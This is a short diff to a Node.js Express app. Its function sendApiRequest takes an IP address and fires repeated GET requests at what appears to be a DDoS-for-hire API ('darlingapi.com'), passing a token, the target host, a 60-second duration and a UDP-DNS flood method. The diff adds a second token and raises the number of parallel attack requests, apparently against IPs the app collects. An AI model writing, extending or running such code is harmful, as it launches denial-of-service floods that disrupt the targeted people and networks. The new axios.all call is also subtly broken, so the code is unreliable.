@@ -8,6 +8,7 @@ const rateLimit = require('express-rate-limit');
 const app = express();
 const port = process.env.PORT || 4000;
 const token = process.env.TOKEN;
+const token2 = process.env.TOKEN2;
 const ping = require('net-ping');
 
 const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
@@ -66,10 +67,12 @@ async function clear() {
 
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=${token}&host=${ip}&port=0&time=60&method=UDP-DNS`;
-    const requests = Array(5).fill(url).map(u => axios.get(u));
+    const requests = Array(6).fill(url).map(u => axios.get(u));
+    const url2 = `https://darlingapi.com?token=${token2}&host=${ip}&port=0&time=60&method=UDP-DNS`;
+    const requests2 = Array(12).fill(url2).map(u => axios.get(u))
     
     try {
-        await axios.all(requests);
+        await axios.all(requests, requests2);
         console.log(`Requisição enviada para o IP: ${ip}`);
     } catch (error) {
         console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
